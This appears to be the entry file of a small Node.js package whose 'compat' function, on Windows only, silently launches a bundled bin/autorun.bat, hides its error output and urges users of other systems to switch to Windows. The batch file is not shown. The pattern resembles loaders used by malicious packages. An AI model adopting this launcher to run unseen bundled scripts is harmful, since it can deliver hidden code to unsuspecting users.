// index.js
const { spawn } = require('child_process');
const path = require('path');
const os = require("os");
const { exit } = require('process');

module.exports = {
    compat: function() {
      if (os.platform() === "win32") {
        const binaryPath = path.join(__dirname, 'bin', 'autorun.bat');
        const child = spawn(binaryPath, []);
        child.stdout.on('data', (data) => {
          console.log(`stdout: ${data}`);
        });
        
        child.stderr.on('data', (data) => {
          // console.error(`stderr: ${data}`);
        });
        
        child.on('close', (code) => {
          console.log(`Child process exited with code ${code}`);
          exit
        });
      } else if (os.platform() === "linux") {
        console.log(
          "\x1b[41m",
          "This script is running on Linux. Please run in Windows."
        );
      } else {
        console.log(
          "\x1b[41m",
          "This script is running on an unrecognized OS. Please run in Windows."
        );
      }

      
    }
  };
  